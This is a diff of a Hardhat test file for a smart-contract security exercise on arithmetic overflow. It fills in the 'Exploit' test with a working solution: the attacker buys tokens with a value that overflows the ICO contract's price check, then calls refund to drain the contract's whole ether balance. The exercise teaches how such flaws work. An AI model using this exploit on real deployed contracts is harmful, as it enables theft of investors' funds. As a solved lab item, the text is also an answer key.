@@ -17,6 +17,7 @@ describe("Arithmetic Over/Underflow Exercise 3", function () {
     const SECOND_INVESTOR_INVESTED = parseEther("126");
     const THIRD_INVESTOR_INVESTED = parseEther("54");
     const SECOND_INVESTOR_REFUNDED = parseEther("26");
+    const MAX_INT = ethers.constants.MaxUint256;
 
     const TOTAL_INVESTED = FIRST_INVESTOR_INVESTED.add(SECOND_INVESTOR_INVESTED)
         .add(THIRD_INVESTOR_INVESTED)
@@ -110,6 +111,10 @@ describe("Arithmetic Over/Underflow Exercise 3", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR SOLUTION HERE */
+        await ico.connect(attacker).buy(MAX_INT.div(10).add(1));
+        const icoFunds = await ethers.provider.getBalance(ico.address)
+        const drainAmountTokens = icoFunds.mul(10);
+        await ico.connect(attacker).refund(drainAmountTokens)
     });
 
     after(async function () {
